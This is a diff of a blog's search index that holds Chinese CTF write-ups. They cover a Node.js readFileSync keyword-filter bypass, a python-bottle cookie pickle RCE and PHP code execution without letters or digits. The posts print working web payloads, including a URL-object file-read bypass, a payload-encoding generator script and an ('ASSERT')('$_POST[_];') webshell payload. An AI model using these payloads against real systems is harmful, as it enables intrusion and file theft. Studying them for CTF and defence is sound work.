@@ -1,64 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>一个fs.readFileSync的trick浅析</title>
-    <url>/2022/09/19/readFileSync/</url>
-    <content><![CDATA[<p>一个<code>fs.readFileSync</code>的trick浅析</p>
-<span id="more"></span>
-
-<p>设想下面一个简单的代码片段：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;bad hacker!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">file</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>一个过滤了关键词<strong>flag</strong>的任意文件读取。</p>
-<p>payload如下：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;file[href]&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[origin]&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[protocol]&quot;</span><span class="punctuation">:</span><span class="string">&quot;file:&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[pathname]&quot;</span><span class="punctuation">:</span><span class="string">&quot;/fl%61g&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[hostname]&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>通过下面的源码分析，我们将得知这个trick的精彩之处。</p>
-<p>首先从文档入手，粗略认识一下<code>fs.readFileSync</code>方法</p>
-<p><img src="/images/20220923230858.png"></p>
-<p>我们注意到<code>path</code>参数可以是一个<code>URL</code>对象，payload中的flag关键字似乎也是利用了url解码的方法进行绕过的。但显然我们无法直接输入一个<code>URL</code>对象，难道还有其它方法能构造出<code>URL</code>对象吗？</p>
-<p><img src="/images/20220924233442.png"></p>
-<p>顺着这个思路，我们开始一步步地跟进源码。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readFileSync</span>(<span class="params">path, options</span>) &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">const</span> isUserFd = <span class="title function_">isFd</span>(path); <span class="comment">// 判断是否为文件描述符</span></span><br><span class="line">  <span class="keyword">const</span> fd = isUserFd ? path : fs.<span class="title function_">openSync</span>(path, options.<span class="property">flag</span>, <span class="number">0o666</span>);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>path</code>如果不是文件描述符的话，将调用<code>fs.openSync</code>。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">openSync</span>(<span class="params">path, flags, mode</span>) &#123;</span><br><span class="line">  path = <span class="title function_">getValidatedPath</span>(path);</span><br><span class="line">  <span class="keyword">const</span> flagsNumber = <span class="title function_">stringToFlags</span>(flags);</span><br><span class="line">  mode = <span class="title function_">parseFileMode</span>(mode, <span class="string">&#x27;mode&#x27;</span>, <span class="number">0o666</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ctx = &#123; path &#125;;</span><br><span class="line">  <span class="keyword">const</span> result = binding.<span class="title function_">open</span>(pathModule.<span class="title function_">toNamespacedPath</span>(path),</span><br><span class="line">                              flagsNumber, mode,</span><br><span class="line">                              <span class="literal">undefined</span>, ctx);</span><br><span class="line">  <span class="title function_">handleErrorFromBinding</span>(ctx);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进<code>getValidatedPath</code>。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getValidatedPath = <span class="title function_">hideStackFrames</span>(<span class="function">(<span class="params">fileURLOrPath, propName = <span class="string">&#x27;path&#x27;</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> path = <span class="title function_">toPathIfFileURL</span>(fileURLOrPath);</span><br><span class="line">  <span class="title function_">validatePath</span>(path, propName);</span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>跟进回调函数中的<code>toPathIfFileURL</code>。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">toPathIfFileURL</span>(<span class="params">fileURLOrPath</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(fileURLOrPath))</span><br><span class="line">    <span class="keyword">return</span> fileURLOrPath;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fileURLToPath</span>(fileURLOrPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进<code>isURLInstance</code>的真假判断</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isURLInstance</span> = (<span class="params">input</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> input != <span class="literal">null</span> &amp;&amp; input.<span class="property">href</span> &amp;&amp; input.<span class="property">origin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果参数对象存在<code>href</code>和<code>origin</code>属性将返回真，此时返回<code>fileURLToPath</code>。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fileURLToPath</span>(<span class="params">path</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> path === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">    path = <span class="keyword">new</span> <span class="title function_">URL</span>(path);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(path))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_ARG_TYPE</span>(<span class="string">&#x27;path&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;URL&#x27;</span>], path);</span><br><span class="line">  <span class="keyword">if</span> (path.<span class="property">protocol</span> !== <span class="string">&#x27;file:&#x27;</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_URL_SCHEME</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> isWindows ? <span class="title function_">getPathFromURLWin32</span>(path) : <span class="title function_">getPathFromURLPosix</span>(path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在<code>fileURLToPath</code>函数内部终于出现了<code>new URL</code>，好耶</p>
-<p>第一个<code>if</code>要求参数对象属性必须得是字符串类型才给我们<code>new</code>，好在这个要求无伤大雅。</p>
-<p>此时它要求我们的<code>protocol</code>属性为<code>file:</code>，否则将会抛出一个错误。</p>
-<p>接下来判断运行系统是否为Windows系统，在环境是Linux的情况下，跟进<code>getPathFromURLPosix</code></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPathFromURLPosix</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">hostname</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_HOST</span>(platform);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> pathname = url.<span class="property">pathname</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> n = <span class="number">0</span>; n &lt; pathname.<span class="property">length</span>; n++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pathname[n] === <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> third = pathname.<span class="title function_">codePointAt</span>(n + <span class="number">2</span>) | <span class="number">0x20</span>;</span><br><span class="line">      <span class="keyword">if</span> (pathname[n + <span class="number">1</span>] === <span class="string">&#x27;2&#x27;</span> &amp;&amp; third === <span class="number">102</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_PATH</span>(</span><br><span class="line">          <span class="string">&#x27;must not include encoded / characters&#x27;</span></span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(pathname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果参数对象的<code>hostname</code>属性不为空的话将再次抛出一个错误，因此我们需要构造一个空的<code>hostname</code>属性，好让函数继续进行下去。</p>
-<p>而剩下的代码和<code>decodeURIComponent</code>就是在帮我们以url解码的方式转换<code>pathname</code>属性了。</p>
-<p><img src="/images/20220925001928.png"></p>
-<p>本地验证大成功。</p>
-<p>这个trick真的很有意思，因为它看似简单，但需要深入源码分析才能明白它的原理。 </p>
-]]></content>
-      <tags>
-        <tag>node.js</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python-bottle Web框架远程命令执行漏洞浅析</title>
     <url>/2022/10/03/bottle_rce/</url>
     <content><![CDATA[<p>昨天刚结束的<strong>SEKAI CTF</strong>上出现了一道<code>python-bottle</code>框架的题目，在没有找到漏洞相关文章或讨论之前（当然，赛后复盘找到了）成功从零开始拿到了flag，可喜可贺，可喜可贺。在寻找漏洞的过程中深感获益良多，以此文章记录之。跨出了源码审计技能的一大步口牙！</p>
 <span id="more"></span>
 
-<h1 id="开幕加食"><a href="#开幕加食" class="headerlink" title="开幕加食"></a>开幕加食</h1><p>题目环境能直接利用<code>os.path.join</code>的特性造成任意文件读取漏洞，但是不能直接读到flag文件。于是乎先读<code>/proc/self/cmdline</code>定位源码文件，把源码拿到本地分析。</p>
+<h1><span id="开幕加食">开幕加食</span></h1><p>题目环境能直接利用<code>os.path.join</code>的特性造成任意文件读取漏洞，但是不能直接读到flag文件。于是乎先读<code>/proc/self/cmdline</code>定位源码文件，把源码拿到本地分析。</p>
 <p>题目的关键代码片段如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=sekai)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=sekai)</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;admin&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pls no hax&quot;</span></span><br></pre></td></tr></table></figure>
 
@@ -73,7 +21,7 @@
 <p>痛，太痛了www</p>
 <p>仔细想想也是，目标模板文件就在<code>/app/views/admin.html</code>里躺着，要是flag就在html文件里的话，又能学到什么新姿势呢？</p>
 <p>半天寻觅无果后，决定直接分析框架源码。</p>
-<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>首先进行静态分析，将重点目标放在了<code>request.get_cookie</code>上。一来要想构造复杂的payload，同时还要满足<code>if</code>语句大概率比较困难，而这是唯一一个无条件进入的函数。二是因为我们能控制的输入点貌似也只有这一处了。</p>
+<h1><span id="静态分析">静态分析</span></h1><p>首先进行静态分析，将重点目标放在了<code>request.get_cookie</code>上。一来要想构造复杂的payload，同时还要满足<code>if</code>语句大概率比较困难，而这是唯一一个无条件进入的函数。二是因为我们能控制的输入点貌似也只有这一处了。</p>
 <p>进入<code>request.get_cookie</code></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">        value = self.cookies.get(key)</span><br><span class="line">        <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">            dec = cookie_decode(value, secret) <span class="comment"># (key, value) tuple or None</span></span><br><span class="line">            <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">        <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure>
 
@@ -95,7 +43,7 @@
 
 <p><code>?</code>仅仅起了个分隔符的作用。这也意味着<code>sig</code>和<code>msg</code>参数很大可能就是被分隔开的两段数据。</p>
 <p>现在挡在我们面前的，只剩下<code>_lscmp</code>了。</p>
-<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p><code>_lscmp</code>实现如下</p>
+<h1><span id="动态调试">动态调试</span></h1><p><code>_lscmp</code>实现如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_lscmp</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">sum</span>(<span class="number">0</span> <span class="keyword">if</span> x==y <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)) <span class="keyword">and</span> <span class="built_in">len</span>(a) == <span class="built_in">len</span>(b)</span><br></pre></td></tr></table></figure>
 
 <p>进行到这一步，静态分析实在难以看清<code>sig</code>和<code>msg</code>两个值之间的联系。参数<code>a</code>好说，而参数<code>b</code>是经过HMAC的md5消息摘要再base64后的<code>msg</code>，并且<code>_lscmp</code>函数的具体流程跟踪也很麻烦。唯一欣慰的是我们拿到了泄漏的<code>key</code>。这种情况下，动态调试是验证之前的猜测和探寻下一步方向的最优解。</p>
@@ -120,7 +68,7 @@
 <p><img src="/images/20221002202950.png"></p>
 <p>可喜可贺，可喜可贺。</p>
 <p>最后flag是个可执行文件，将pickle中的命令执行部分替换为<code>/flag</code>就好。</p>
-<h1 id="来自2013的issue"><a href="#来自2013的issue" class="headerlink" title="来自2013的issue"></a>来自2013的issue</h1><p>赛后我终于反应过来，不再局限于试图查找此漏洞相关的完整分析文章，转而去查找github上的项目issue是否另有大佬向开发者反映过这种有风险的框架逻辑，终于找到了相关的讨论。</p>
+<h1><span id="来自2013的issue">来自2013的issue</span></h1><p>赛后我终于反应过来，不再局限于试图查找此漏洞相关的完整分析文章，转而去查找github上的项目issue是否另有大佬向开发者反映过这种有风险的框架逻辑，终于找到了相关的讨论。</p>
 <p><a href="https://github.com/bottlepy/bottle/issues/447">https://github.com/bottlepy/bottle/issues/447</a></p>
 <p><img src="/images/20221002204709.png"></p>
 <p><a href="https://github.com/bottlepy/bottle/issues/900">https://github.com/bottlepy/bottle/issues/900</a></p>
@@ -250,278 +198,6 @@
       </tags>
   </entry>
   <entry>
-    <title>无字母数字RCE初探</title>
-    <url>/2022/03/28/rce_without_w_and_n/</url>
-    <content><![CDATA[<p>没有blacklist的rce是没有灵魂的！</p>
-<span id="more"></span>
-
-<p>有人说，说是有人在blacklist里下了毒（指<code>/[a-zA-Z0-9]+/</code></p>
-<p>害羞羞，你看你就会开玩笑（指绕过</p>
-<p>本地写个青春版</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
-
-<h1><span id="取反">取反</span></h1><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p>
-<p>举个栗子</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure>
-
-<p><code>233</code>的二进制值为<code>0000 0000 1110 1001</code></p>
-<p>按位取反得<code>1111 1111 0001 0110</code>，即<code>-234</code>。</p>
-<p>ps：我们可能更熟悉长成<code>1000 0000 1110 1010</code>的<code>-234</code>，其实它们是等价的，只是表示方法不同。前者是补码形式，后者是原码形式，最高位都为符号位。关于<a href="https://www.cnblogs.com/ydqblogs/p/13823206.html">原码，反码，补码</a></p>
-<p>那么对于字母而言，我们也就能通过其他字符加上取反操作得到我们想到的组合了。</p>
-<p>大部分情况下都会加上<code>urlencode()</code>，出现乱码总是很老火的说</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>最终payload为<code>(%8F%97%8F%96%91%99%90)();</code>。</p>
-<p>相信不止我一个人在刚接触这种姿势时认为，将<code>phpinfo();</code>这完整的函数进行取反不是能减少一些操作嘛，为什么要单独取反函数名再加上括号和分号呢？</p>
-<p>让我们把这段代码再回下锅</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
-
-<p><code>eval()</code>首先执行的操作是取反<code>~</code>，而取反后的最终结果只会是单纯的字符串。得出<code>phpinfo</code>后，如果再加上外部的括号，得到的实际上是<code>(&#39;phpinfo&#39;)()</code>，经过<code>eval()</code>的解析，在php7及以上版本中这种写法会被认为是函数，因此会执行后续的payload。分号作为一句完整代码的结束标志，就和平时写代码一样。</p>
-<p>我们将括号分号一齐加入取反的队伍，取反后得到了<code>phpinfo();</code>，看似没有多大差别，但我们要知道，这是一串字符串，只是一串字符串。<code>eval()</code>对单纯的字符串又有什么坏心思呢？于是就没有后续了。（悲</p>
-<p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1><span id="异或">异或</span></h1><p>万恶之源 我很异或（疑惑）的出处</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
-
-<p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p>
-<p>选择异或的理由？同或不行吗？当然可以!</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>|<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># c</span></span><br></pre></td></tr></table></figure>
-
-<p>不过异或运算的一大特点是<strong>运算可逆</strong>，异或字符和被异或字符运算的结果能倒着异或回去得到相同的结果，相对同或来说，这为我们寻找payload提供了莫大的便利。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure>
-
-<p>（脚本绝赞升级中）</p>
-<h1><span id="自增">自增</span></h1><p>php的字符自增和C的ASCII值自增有很大不同。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># aa</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># ab</span></span><br></pre></td></tr></table></figure>
-
-<p>同时我们要注意字符变量只能递增，不能递减，且只支持纯字母（a-z 和 A-Z），递增或递减其他字符变量是没有用的哦。</p>
-<p>基于此特性，我们要想获得小写字母，就要从<code>a</code>开始自增，要想获得大写字母，就从<code>A</code>开始。</p>
-<p>同时，在php中如果强制连接数组和字符串，会发生强制类型转换，数组将被转为字符串，且值为<code>Array</code>。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>; <span class="comment"># Array</span></span><br></pre></td></tr></table></figure>
-
-<p>好巧不巧，这<code>Array</code>里不仅有<code>A</code>还有<code>a</code>，再配合自增，我们就能构造出任意英文字母了。</p>
-<p>自搓脚本 梅开二度（指很拉的构造 太弱小了 没有力量</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span> = [].<span class="string">&#x27;&#x27;</span>;          <span class="comment"># $__ = &#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>[<span class="string">&#x27;!&#x27;</span> == <span class="string">&#x27;?&#x27;</span>]; <span class="comment"># $_ = $__[0];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;            <span class="comment"># A</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$____</span> = ++<span class="variable">$_</span>;         <span class="comment"># E</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_____</span> = ++<span class="variable">$_</span>;        <span class="comment"># O</span></span><br><span class="line"><span class="variable">$______</span> = ++<span class="variable">$_</span>;       <span class="comment"># P</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_______</span> = ++<span class="variable">$_</span>;      <span class="comment"># R</span></span><br><span class="line"><span class="variable">$________</span> = ++<span class="variable">$_</span>;     <span class="comment"># S</span></span><br><span class="line"><span class="variable">$_________</span> = ++<span class="variable">$_</span>;    <span class="comment"># T</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$___</span>.<span class="variable">$________</span>.<span class="variable">$________</span>.<span class="variable">$____</span>.<span class="variable">$_______</span>.<span class="variable">$_________</span>)(<span class="string">&#x27;$_&#x27;</span>.<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$________</span>.<span class="variable">$_________</span>.<span class="string">&#x27;[_];&#x27;</span>);</span><br><span class="line"><span class="comment"># (&#x27;ASSERT&#x27;)(&#x27;$_POST[_];&#x27;);</span></span><br></pre></td></tr></table></figure>
-
-<p>看着熟悉的<code>eval()</code>消失在payload里，心态逐渐发生了一些微妙的变化</p>
-<p>事实上，<code>assert()</code>的构造在php7中和<code>eval()</code>一样，也变成了一种语言结构而不是一个函数，这导致此类payload在php7及以上版本环境中全部无效。</p>
-<p><a href="https://www.anquanke.com/post/id/173201">浅谈eval和assert</a>对此做了一些补充说明。</p>
-<p>真搞事还得是<code>system()</code>啊（确信</p>
-<p>又由于自增类型的payload太长，非常容易被长度限制，因此命令执行还是用取反或者异或叭。</p>
-]]></content>
-      <tags>
-        <tag>php-rce</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php伪协议解析及适用场景总结</title>
-    <url>/2021/12/21/php_wrappers/</url>
